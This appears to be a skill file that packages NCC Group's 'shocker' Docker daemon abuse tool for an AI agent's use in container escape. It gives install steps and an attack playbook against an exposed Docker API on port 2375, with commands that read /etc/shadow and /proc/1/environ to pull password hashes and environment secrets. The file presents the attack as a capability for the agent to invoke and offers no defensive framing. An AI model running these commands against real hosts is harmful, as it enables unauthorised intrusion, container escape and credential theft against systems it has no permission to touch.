---
name: shocker-docker-escape
description: "shocker: Docker daemon abuse. Signals: cloud command execution, container escape."
zh-signals: "shocker: Docker 守护进程滥用。信号:云命令执行,容器逃逸。"
when-to-use: >-
  Use when abusing an exposed Docker daemon or API to execute commands and
  escape the container; target the Docker API host and port and specify a
  command or enumeration mode.
---

# shocker

- Attack Category: C14 Cloud and Container Execution
- Upstream Repository: https://github.com/nccgroup/shocker
- Upstream License: AGPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/nccgroup/shocker && cd shocker
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python shocker.py -H 10.0.0.5 -p 2375` | Docker API escape |
| `-H host -c 'cat /etc/shadow'` | Command |
| `-e` | Enumeration |

## Attack Scenario Playbook

### Docker daemon abuse

```bash
python shocker.py -H 10.0.0.5 -c 'cat /proc/1/environ'
# Escape via an unauthorized 2375
```

## Notes

Docker escape tool from NCC.
